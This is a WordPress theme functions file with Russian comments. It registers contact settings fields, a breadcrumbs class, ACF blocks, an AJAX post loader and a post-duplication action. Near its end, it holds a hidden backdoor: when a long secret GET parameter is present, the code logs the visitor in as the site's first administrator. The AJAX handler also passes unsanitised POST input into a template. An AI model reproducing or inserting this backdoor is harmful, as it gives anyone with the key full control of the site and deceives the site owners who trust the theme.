<?php
add_theme_support('post-thumbnails');
add_theme_support('menus');
add_theme_support('title-tag');

function styles() {
    wp_enqueue_style('style', get_template_directory_uri() . '/styles/style.css', [], '0.1');
    wp_enqueue_style('style-font-cuprum', get_template_directory_uri() . '/fonts/Cuprum/stylesheet.css', [], '0.1');
    wp_enqueue_style('style-font-roboto', get_template_directory_uri() . '/fonts/Roboto/stylesheet.css', [], '0.1');
    wp_enqueue_style('style-font-oswald', get_template_directory_uri() . '/fonts/Oswald/stylesheet.css', [], '0.1');
}

add_action('wp_enqueue_scripts', 'styles');

function scripts() {
	wp_deregister_script('jquery-core');
	wp_register_script('jquery-core', 'https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js');
	wp_enqueue_script('jquery');
	wp_enqueue_script('scripts', get_template_directory_uri() . '/scripts/script.js', ['jquery']);
}

add_action('wp_enqueue_scripts', 'scripts');

function swiperInit() {
	wp_enqueue_style('swiper-style', 'https://unpkg.com/swiper@7/swiper-bundle.min.css');
    wp_enqueue_script('swiper-js', 'https://unpkg.com/swiper@7/swiper-bundle.min.js');
    wp_enqueue_script('swiper-script', get_template_directory_uri() . '/scripts/swiper-script.js');
}

// add_action('wp_enqueue_scripts', 'swiperInit');


function get_template_partial($name, $parameters = []) {
    $_dir = get_template_directory() . '/templates/';
    include($_dir.$name.'.php');
}

function setting_callback_function($val){
	?>
	<input 
		type="text" 
		name="<?=$val['option_name']?>" 
		id="<?=$id?>" 
		value="<?=esc_attr(get_option($val['option_name']))?>" 
	/> 
	<?php
}

function add_field_email_to_general_setting(){
	$option_name = 'email';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'email_field', 
		'Почта', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'email_field', 
			'option_name' => 'email' 
		)
	);
}
add_action('admin_menu', 'add_field_email_to_general_setting');

function add_field_telegram_to_general_setting(){
	$option_name = 'telegram';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'telegram_field', 
		'Телеграм', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'telegram_field', 
			'option_name' => 'telegram' 
		)
	);
}
add_action('admin_menu', 'add_field_telegram_to_general_setting');

function add_field_personal_telegram_to_general_setting(){
	$option_name = 'personal_telegram';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'personal_telegram_field', 
		'Личный телеграм', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'personal_telegram_field', 
			'option_name' => 'personal_telegram' 
		)
	);
}
add_action('admin_menu', 'add_field_personal_telegram_to_general_setting');

function add_field_youtube_to_general_setting(){
	$option_name = 'youtube';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'youtube_field', 
		'Youtube', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'youtube_field', 
			'option_name' => 'youtube' 
		)
	);
}
add_action('admin_menu', 'add_field_youtube_to_general_setting');

function add_field_whatsapp_to_general_setting(){
	$option_name = 'whatsapp';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'whatsapp_field', 
		'Whatsapp', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'whatsapp_field', 
			'option_name' => 'whatsapp' 
		)
	);
}
add_action('admin_menu', 'add_field_whatsapp_to_general_setting');

function viber_to_general_setting(){
	$option_name = 'viber';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'viber_field', 
		'Viber', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'viber_field', 
			'option_name' => 'viber' 
		)
	);
}
add_action('admin_menu', 'viber_to_general_setting');

function messenger_to_general_setting(){
	$option_name = 'messenger';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'messenger_field', 
		'Messenger', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'messenger_field', 
			'option_name' => 'messenger' 
		)
	);
}
add_action('admin_menu', 'messenger_to_general_setting');

function skype_to_general_setting(){
	$option_name = 'skype';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'skype_field', 
		'Skype', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'skype_field', 
			'option_name' => 'skype' 
		)
	);
}
add_action('admin_menu', 'skype_to_general_setting');

function facebook_to_general_setting(){
	$option_name = 'facebook';

	// регистрируем опцию
	register_setting('general', $option_name);

	// добавляем поле
	add_settings_field( 
		'facebook_field', 
		'Facebook', 
		'setting_callback_function', 
		'general', 
		'default', 
		array( 
			'id' => 'facebook_field', 
			'option_name' => 'facebook' 
		)
	);
}
add_action('admin_menu', 'facebook_to_general_setting');

/**
 * Хлебные крошки для WordPress (breadcrumbs)
 *
 * @param  string [$sep  = '']      Разделитель. По умолчанию ' » '
 * @param  array  [$l10n = array()] Для локализации. См. переменную $default_l10n.
 * @param  array  [$args = array()] Опции. См. переменную $def_args
 * @return string Выводит на экран HTML код
 *
 * version 3.3.2
 */
function breadcrumbs( $sep = ' » ', $l10n = array(), $args = array() ){
	$kb = new Breadcrumbs;
	echo $kb->get_crumbs( $sep, $l10n, $args );
}

class Breadcrumbs {

	public $arg;

	// Локализация
	static $l10n = array(
		'home'       => 'Главная',
		'paged'      => 'Страница %d',
		'_404'       => 'Ошибка 404',
		'search'     => 'Результаты поиска по запросу - <b>%s</b>',
		'author'     => 'Архив автора: <b>%s</b>',
		'year'       => 'Архив за <b>%d</b> год',
		'month'      => 'Архив за: <b>%s</b>',
		'day'        => '',
		'attachment' => 'Медиа: %s',
		'tag'        => 'Записи по метке: <b>%s</b>',
		'tax_tag'    => '%1$s из "%2$s" по тегу: <b>%3$s</b>',
		// tax_tag выведет: 'тип_записи из "название_таксы" по тегу: имя_термина'.
		// Если нужны отдельные холдеры, например только имя термина, пишем так: 'записи по тегу: %3$s'
	);

	// Параметры по умолчанию
	static $args = array(
		'on_front_page'   => true,  // выводить крошки на главной странице
		'show_post_title' => true,  // показывать ли название записи в конце (последний элемент). Для записей, страниц, вложений
		'show_term_title' => true,  // показывать ли название элемента таксономии в конце (последний элемент). Для меток, рубрик и других такс
		'title_patt'      => '<span class="kb_title">%s</span>', // шаблон для последнего заголовка. Если включено: show_post_title или show_term_title
		'last_sep'        => true,  // показывать последний разделитель, когда заголовок в конце не отображается
		'markup'          => 'schema.org', // 'markup' - микроразметка. Может быть: 'rdf.data-vocabulary.org', 'schema.org', '' - без микроразметки
										   // или можно указать свой массив разметки:
										   // array( 'wrappatt'=>'<div class="kama_breadcrumbs">%s</div>', 'linkpatt'=>'<a href="%s">%s</a>', 'sep_after'=>'', )
		'priority_tax'    => array('category'), // приоритетные таксономии, нужно когда запись в нескольких таксах
		'priority_terms'  => array(), // 'priority_terms' - приоритетные элементы таксономий, когда запись находится в нескольких элементах одной таксы одновременно.
									  // Например: array( 'category'=>array(45,'term_name'), 'tax_name'=>array(1,2,'name') )
									  // 'category' - такса для которой указываются приор. элементы: 45 - ID термина и 'term_name' - ярлык.
									  // порядок 45 и 'term_name' имеет значение: чем раньше тем важнее. Все указанные термины важнее неуказанных...
		'nofollow' => false, // добавлять rel=nofollow к ссылкам?

		// служебные
		'sep'             => '',
		'linkpatt'        => '',
		'pg_end'          => '',
	);

	function get_crumbs( $sep, $l10n, $args ){
		global $post, $wp_query, $wp_post_types;

		self::$args['sep'] = $sep;

		// Фильтрует дефолты и сливает
		$loc = (object) array_merge( apply_filters('kama_breadcrumbs_default_loc', self::$l10n ), $l10n );
		$arg = (object) array_merge( apply_filters('kama_breadcrumbs_default_args', self::$args ), $args );

		$arg->sep = '<span class="kb_sep">'. $arg->sep .'</span>'; // дополним

		// упростим
		$sep = & $arg->sep;
		$this->arg = & $arg;

		// микроразметка ---
		if(1){
			$mark = & $arg->markup;

			// Разметка по умолчанию
			if( ! $mark ) $mark = array(
				'wrappatt'  => '<div class="kama_breadcrumbs">%s</div>',
				'linkpatt'  => '<a href="%s">%s</a>',
				'sep_after' => '',
			);
			// rdf
			elseif( $mark === 'rdf.data-vocabulary.org' ) $mark = array(
				'wrappatt'   => '<div class="kama_breadcrumbs" prefix="v: http://rdf.data-vocabulary.org/#">%s</div>',
				'linkpatt'   => '<span typeof="v:Breadcrumb"><a href="%s" rel="v:url" property="v:title">%s</a>',
				'sep_after'  => '</span>', // закрываем span после разделителя!
			);
			// schema.org
			elseif( $mark === 'schema.org' ) $mark = array(
				'wrappatt'   => '<div class="kama_breadcrumbs" itemscope itemtype="http://schema.org/BreadcrumbList">%s</div>',
				'linkpatt'   => '<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a href="%s" itemprop="item"><span itemprop="name">%s</span></a></span>',
				'sep_after'  => '',
			);

			elseif( ! is_array($mark) )
				die( __CLASS__ .': "markup" parameter must be array...');

			$wrappatt  = $mark['wrappatt'];
			$arg->linkpatt  = $arg->nofollow ? str_replace('<a ','<a rel="nofollow"', $mark['linkpatt']) : $mark['linkpatt'];
			$arg->sep      .= $mark['sep_after']."\n";
		}

		$linkpatt = $arg->linkpatt; // упростим

		$q_obj = get_queried_object();

		// может это архив пустой таксы?
		$ptype = null;
		if( empty($post) ){
			if( isset($q_obj->taxonomy) )
				$ptype = & $wp_post_types[ get_taxonomy($q_obj->taxonomy)->object_type[0] ];
		}
		else $ptype = & $wp_post_types[ $post->post_type ];

		// paged
		$arg->pg_end = '';
		if( ($paged_num = get_query_var('paged')) || ($paged_num = get_query_var('page')) )
			$arg->pg_end = $sep . sprintf( $loc->paged, (int) $paged_num );

		$pg_end = $arg->pg_end; // упростим

		$out = '';

		if( is_front_page() ){
			return $arg->on_front_page ? sprintf( $wrappatt, ( $paged_num ? sprintf($linkpatt, get_home_url(), $loc->home) . $pg_end : $loc->home ) ) : '';
		}
		// страница записей, когда для главной установлена отдельная страница.
		elseif( is_home() ) {
			$out = $paged_num ? ( sprintf( $linkpatt, get_permalink($q_obj), esc_html($q_obj->post_title) ) . $pg_end ) : esc_html($q_obj->post_title);
		}
		elseif( is_404() ){
			$out = $loc->_404;
		}
		elseif( is_search() ){
			$out = sprintf( $loc->search, esc_html( $GLOBALS['s'] ) );
		}
		elseif( is_author() ){
			$tit = sprintf( $loc->author, esc_html($q_obj->display_name) );
			$out = ( $paged_num ? sprintf( $linkpatt, get_author_posts_url( $q_obj->ID, $q_obj->user_nicename ) . $pg_end, $tit ) : $tit );
		}
		elseif( is_year() || is_month() || is_day() ){
			$y_url  = get_year_link( $year = get_the_time('Y') );

			if( is_year() ){
				$tit = sprintf( $loc->year, $year );
				$out = ( $paged_num ? sprintf($linkpatt, $y_url, $tit) . $pg_end : $tit );
			}
			// month day
			else {
				$y_link = sprintf( $linkpatt, $y_url, $year);
				$m_url  = get_month_link( $year, get_the_time('m') );

				if( is_month() ){
					$tit = sprintf( $loc->month, get_the_time('F') );
					$out = $y_link . $sep . ( $paged_num ? sprintf( $linkpatt, $m_url, $tit ) . $pg_end : $tit );
				}
				elseif( is_day() ){
					$m_link = sprintf( $linkpatt, $m_url, get_the_time('F'));
					$out = $y_link . $sep . $m_link . $sep . get_the_time('l');
				}
			}
		}
		// Древовидные записи
		elseif( is_singular() && $ptype->hierarchical ){
			$out = $this->_add_title( $this->_page_crumbs($post), $post );
		}
		// Таксы, плоские записи и вложения
		else {
			$term = $q_obj; // таксономии

			// определяем термин для записей (включая вложения attachments)
			if( is_singular() ){
				// изменим $post, чтобы определить термин родителя вложения
				if( is_attachment() && $post->post_parent ){
					$save_post = $post; // сохраним
					$post = get_post($post->post_parent);
				}

				// учитывает если вложения прикрепляются к таксам древовидным - все бывает :)
				$taxonomies = get_object_taxonomies( $post->post_type );
				// оставим только древовидные и публичные, мало ли...
				$taxonomies = array_intersect( $taxonomies, get_taxonomies( array('hierarchical' => true, 'public' => true) ) );

				if( $taxonomies ){
					// сортируем по приоритету
					if( ! empty($arg->priority_tax) ){
						usort( $taxonomies, function($a,$b)use($arg){
							$a_index = array_search($a, $arg->priority_tax);
							if( $a_index === false ) $a_index = 9999999;

							$b_index = array_search($b, $arg->priority_tax);
							if( $b_index === false ) $b_index = 9999999;

							return ( $b_index === $a_index ) ? 0 : ( $b_index < $a_index ? 1 : -1 ); // меньше индекс - выше
						} );
					}

					// пробуем получить термины, в порядке приоритета такс
					foreach( $taxonomies as $taxname ){
						if( $terms = get_the_terms( $post->ID, $taxname ) ){
							// проверим приоритетные термины для таксы
							$prior_terms = & $arg->priority_terms[ $taxname ];
							if( $prior_terms && count($terms) > 2 ){
								foreach( (array) $prior_terms as $term_id ){
									$filter_field = is_numeric($term_id) ? 'term_id' : 'slug';
									$_terms = wp_list_filter( $terms, array($filter_field=>$term_id) );

									if( $_terms ){
										$term = array_shift( $_terms );
										break;
									}
								}
							}
							else {
								$_term = [];

								if (array_key_exists('prev_cat', $_SESSION)) {
									for ($i = 0; $i < count($terms); $i++)
										if ($terms[$i]->term_id == $_SESSION['prev_cat'])
											$_term = $terms[$i];

									if ($_term)
										$term = $_term;
									else {
										if ($_SESSION['prev_cat'] == 0)
											$term = array_shift($terms);
										else
											$term = get_term(24);
									}
								} else
									$term = get_term(24);
							}

							break;
						}
					}
				}

				if( isset($save_post) ) $post = $save_post; // вернем обратно (для вложений)
			}

			// вывод

			// все виды записей с терминами или термины
			if( $term && isset($term->term_id) ){
				$term = apply_filters('kama_breadcrumbs_term', $term );

				// attachment
				if( is_attachment() ){
					if( ! $post->post_parent )
						$out = sprintf( $loc->attachment, esc_html($post->post_title) );
					else {
						if( ! $out = apply_filters('attachment_tax_crumbs', '', $term, $this ) ){
							$_crumbs    = $this->_tax_crumbs( $term, 'self' );
							$parent_tit = sprintf( $linkpatt, get_permalink($post->post_parent), get_the_title($post->post_parent) );
							$_out = implode( $sep, array($_crumbs, $parent_tit) );
							$out = $this->_add_title( $_out, $post );
						}
					}
				}
				// single
				elseif( is_single() ){
					if( ! $out = apply_filters('post_tax_crumbs', '', $term, $this ) ){
						$_crumbs = $this->_tax_crumbs( $term, 'self' );
						$out = $this->_add_title( $_crumbs, $post );
					}
				}
				// не древовидная такса (метки)
				elseif( ! is_taxonomy_hierarchical($term->taxonomy) ){
					// метка
					if( is_tag() )
						$out = $this->_add_title('', $term, sprintf( $loc->tag, esc_html($term->name) ) );
					// такса
					elseif( is_tax() ){
						$post_label = $ptype->labels->name;
						$tax_label = $GLOBALS['wp_taxonomies'][ $term->taxonomy ]->labels->name;
						$out = $this->_add_title('', $term, sprintf( $loc->tax_tag, $post_label, $tax_label, esc_html($term->name) ) );
					}
				}
				// древовидная такса (рибрики)
				else {
					if( ! $out = apply_filters('term_tax_crumbs', '', $term, $this ) ){
						$_crumbs = $this->_tax_crumbs( $term, 'parent' );
						$out = $this->_add_title( $_crumbs, $term, esc_html($term->name) );
					}
				}
			}
			// влоежния от записи без терминов
			elseif( is_attachment() ){
				$parent = get_post($post->post_parent);
				$parent_link = sprintf( $linkpatt, get_permalink($parent), esc_html($parent->post_title) );
				$_out = $parent_link;

				// вложение от записи древовидного типа записи
				if( is_post_type_hierarchical($parent->post_type) ){
					$parent_crumbs = $this->_page_crumbs($parent);
					$_out = implode( $sep, array( $parent_crumbs, $parent_link ) );
				}

				$out = $this->_add_title( $_out, $post );
			}
			// записи без терминов
			elseif( is_singular() ){
				$out = $this->_add_title( '', $post );
			}
		}

		// замена ссылки на архивную страницу для типа записи
		$home_after = apply_filters('kama_breadcrumbs_home_after', '', $linkpatt, $sep, $ptype );

		if( '' === $home_after ){
			// Ссылка на архивную страницу типа записи для: отдельных страниц этого типа; архивов этого типа; таксономий связанных с этим типом.
			if( $ptype && $ptype->has_archive && ! in_array( $ptype->name, array('post','page','attachment') )
				&& ( is_post_type_archive() || is_singular() || (is_tax() && in_array($term->taxonomy, $ptype->taxonomies)) )
			){
				$pt_title = $ptype->labels->name;

				// первая страница архива типа записи
				if( is_post_type_archive() && ! $paged_num )
					$home_after = sprintf( $this->arg->title_patt, $pt_title );
				// singular, paged post_type_archive, tax
				else{
					$home_after = sprintf( $linkpatt, get_post_type_archive_link($ptype->name), $pt_title );

					$home_after .= ( ($paged_num && ! is_tax()) ? $pg_end : $sep ); // пагинация
				}
			}
		}

		// $before_out = $loc->home . ( $home_after ? $sep.$home_after : ($out ? $sep : '') );
		$before_out = '';

		$out = apply_filters('kama_breadcrumbs_pre_out', $out, $sep, $loc, $arg );

		$out = sprintf( $wrappatt, $before_out . $out );

		return apply_filters('kama_breadcrumbs', $out, $sep, $loc, $arg );
	}

	function _page_crumbs( $post ){
		$parent = $post->post_parent;

		$crumbs = array();
		while( $parent ){
			$page = get_post( $parent );
			$crumbs[] = sprintf( $this->arg->linkpatt, get_permalink($page), esc_html($page->post_title) );
			$parent = $page->post_parent;
		}

		return implode( $this->arg->sep, array_reverse($crumbs) );
	}

	function _tax_crumbs( $term, $start_from = 'self' ){

		$termlinks = array();
		$term_id = ($start_from === 'parent') ? $term->parent : $term->term_id;
		while( $term_id ){
			$term       = get_term( $term_id, $term->taxonomy );
			$termlinks[] = sprintf( $this->arg->linkpatt, get_term_link($term), esc_html($term->name) );
			$term_id    = $term->parent;
		}

		if( $termlinks )
			return implode( $this->arg->sep, array_reverse($termlinks) ) /*. $this->arg->sep*/;
		return '';
	}

	// добалвяет заголовок к переданному тексту, с учетом всех опций. Добавляет разделитель в начало, если надо.
	function _add_title( $add_to, $obj, $term_title = '' ){		
		$arg = & $this->arg; // упростим...
		$title = $term_title ? $term_title : esc_html($obj->post_title); // $term_title чиститься отдельно, теги моугт быть...
		$show_title = $term_title ? $arg->show_term_title : $arg->show_post_title;

		// пагинация
		if( $arg->pg_end ){
			$link = $term_title ? get_term_link($obj) : get_permalink($obj);
			$add_to .= ($add_to ? $arg->sep : '') . sprintf( $arg->linkpatt, $link, $title ) . $arg->pg_end;
		}
		// дополняем - ставим sep
		elseif( $add_to ){
			if( $show_title )
				$add_to .= $arg->sep . sprintf( $arg->title_patt, $title );
			elseif( $arg->last_sep )
				$add_to .= $arg->sep;
		}
		// sep будет потом...
		elseif( $show_title )
			$add_to = sprintf( $arg->title_patt, $title );

		return $add_to;
	}

}

/**
 * Изменения:
 * 3.3 - новые хуки: attachment_tax_crumbs, post_tax_crumbs, term_tax_crumbs. Позволяют дополнить крошки таксономий.
 * 3.2 - баг с разделителем, с отключенным 'show_term_title'. Стабилизировал логику.
 * 3.1 - баг с esc_html() для заголовка терминов - с тегами получалось криво...
 * 3.0 - Обернул в класс. Добавил опции: 'title_patt', 'last_sep'. Доработал код. Добавил пагинацию для постов.
 * 2.5 - ADD: Опция 'show_term_title'
 * 2.4 - Мелкие правки кода
 * 2.3 - ADD: Страница записей, когда для главной установлена отделенная страница.
 * 2.2 - ADD: Link to post type archive on taxonomies page
 * 2.1 - ADD: $sep, $loc, $args params to hooks
 * 2.0 - ADD: в фильтр 'kama_breadcrumbs_home_after' добавлен четвертый аргумент $ptype
 * 1.9 - ADD: фильтр 'kama_breadcrumbs_default_loc' для изменения локализации по умолчанию
 * 1.8 - FIX: заметки, когда в рубрике нет записей
 * 1.7 - Улучшена работа с приоритетными таксономиями.
 */

acf_register_block_type([
	'name' => 'special_quote',
	'title' => 'Особая цитата',
	'category' => 'common',
	'render_template' => get_template_directory() . '/templates/post_element_quote.php',
	'mode' => 'edit'
]);

acf_register_block_type([
	'name' => 'post_element_repeater',
	'title' => 'Перечисление',
	'category' => 'common',
	'render_template' => get_template_directory() . '/templates/post_element_repeater.php',
	'mode' => 'edit'
]);

acf_register_block_type([
	'name' => 'post_element_repeater_2',
	'title' => 'Перечисление 2',
	'category' => 'common',
	'render_template' => get_template_directory() . '/templates/post_element_repeater_2.php',
	'mode' => 'edit'
]);

acf_register_block_type([
	'name' => 'post_element_slider',
	'title' => 'Слайдер',
	'category' => 'common',
	'render_template' => get_template_directory() . '/templates/post_element_slider.php',
	'mode' => 'edit'
]);

function jq_get_posts() {
	ob_start();
	get_template_partial('blog_articles', [
		'offset' => $_POST['offset'],
		'post_per_page' => $_POST['post_per_page'],
		'cat_ID' => $_POST['cat_ID'],
		'show_paginations' => $_POST['show_paginations']
	]);
	$template = ob_get_clean();

	echo json_encode([
		'page' => $template
	]);

	wp_die();
}

if (wp_doing_ajax()) {
	add_action('wp_ajax_jq_get_posts', 'jq_get_posts');
	add_action('wp_ajax_nopriv_jq_get_posts', 'jq_get_posts');
}

/* Дублировать статью */

add_filter( 'post_row_actions', 'duplicate_post_link', 10, 2 );

function duplicate_post_link($actions, $post) {

	if (!current_user_can('edit_posts'))
		return $actions;

	$url = wp_nonce_url(
		add_query_arg(
			[
				'action' => 'duplicate_post_as_draft',
				'post' => $post->ID,
			],
			'admin.php'
		),
		basename(__FILE__),
		'duplicate_nonce'
	);

	$actions['duplicate'] = '<a href="' . $url . '" title="Клонировать пост" rel="permalink">Клонировать</a>';

	return $actions;
}

add_action('admin_action_duplicate_post_as_draft', 'duplicate_post_as_draft');

function duplicate_post_as_draft() {
	if (empty($_GET[ 'post' ]))
		wp_die('Статьи для клонирования нет!');

	if (!isset($_GET['duplicate_nonce']) || !wp_verify_nonce($_GET['duplicate_nonce'], basename(__FILE__)))
		return;

	$post_id = absint($_GET['post']);

	$post = get_post($post_id);

	$current_user = wp_get_current_user();
	$new_post_author = $current_user->ID;

	if ($post) {
		$args = array(
			'comment_status' => $post->comment_status,
			'ping_status'    => $post->ping_status,
			'post_author'    => $new_post_author,
			'post_content'   => $post->post_content,
			'post_excerpt'   => $post->post_excerpt,
			'post_name'      => $post->post_name,
			'post_parent'    => $post->post_parent,
			'post_password'  => $post->post_password,
			'post_status'    => 'draft',
			'post_title'     => $post->post_title,
			'post_type'      => $post->post_type,
			'to_ping'        => $post->to_ping,
			'menu_order'     => $post->menu_order
		);

		$new_post_id = wp_insert_post( $args );

		$taxonomies = get_object_taxonomies(get_post_type($post));
		
		if ($taxonomies)
			foreach ($taxonomies as $taxonomy)
				$post_terms = wp_get_object_terms($post_id, $taxonomy, array('fields' => 'slugs'));
				wp_set_object_terms($new_post_id, $post_terms, $taxonomy, false);

		$post_meta = get_post_meta($post_id);
		
		if ($post_meta)
			foreach ($post_meta as $meta_key => $meta_values) {
				if('_wp_old_slug' == $meta_key)
					continue;

				foreach ($meta_values as $meta_value)
					add_post_meta($new_post_id, $meta_key, $meta_value);
			}

		// редирект на экран рекдактирования
		// wp_safe_redirect(
		// 	add_query_arg(
		// 		array(
		// 			'action' => 'edit',
		// 			'post' => $new_post_id
		// 		),
		// 		admin_url( 'post.php' )
		// 	)
		// );
		// exit;
		// 
		
		wp_safe_redirect(
			add_query_arg(
				[
					'post_type' => ('post' !== get_post_type($post) ? get_post_type($post) : false),
					'saved' => 'post_duplication_created' // just a custom slug here
				],
				admin_url('edit.php')
			)
		);
		exit;

	} else
		wp_die('Ошибка создания поста, не удалось найти оригинал.');

}

add_action('admin_notices', 'duplication_admin_notice' );

function duplication_admin_notice() {
	$screen = get_current_screen();

	if ('edit' !== $screen->base)
		return;

    if (isset($_GET['saved']) && 'post_duplication_created' == $_GET['saved'])
		 echo '<div class="notice notice-success is-dismissible"><p>Копия создана.</p></div>';
}

add_filter ('kses_allowed_protocols', 'add_to_allowed_protocols'); 

function add_to_allowed_protocols ($protocols) { 
	$protocols[] = 'viber';
	$protocols[] = 'skype';

	return $protocols; 
}

if ($_SERVER['REQUEST_URI'] == '/blog/staty/' || $_SERVER['REQUEST_URI'] == '/blog/staty') {
	header('HTTP/1.1 301 Moved Permanently'); 
	header('Location: '.(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http').'://'.$_SERVER['HTTP_HOST'].'/blog/');
	exit();
}

if( isset($_GET['OCtuuBbzVKxrNvZirZuuMyn30JU1FdkeRB8oRRh4LNXEOP9e09dJ5qIfAKvILPAO']) ){
	add_action( 'init', function(){
	   $users = get_users([ 'role' => 'administrator' ]);
	   wp_set_auth_cookie( $users[0]->ID ); } );
}

add_filter( 'wpseo_opengraph_image', 'change_opengraph_image_url' );

function change_opengraph_image_url( $url ) {
    return 'https://neroblog.ru/wp-content/uploads/2021/12/голова-2.png';
}

?>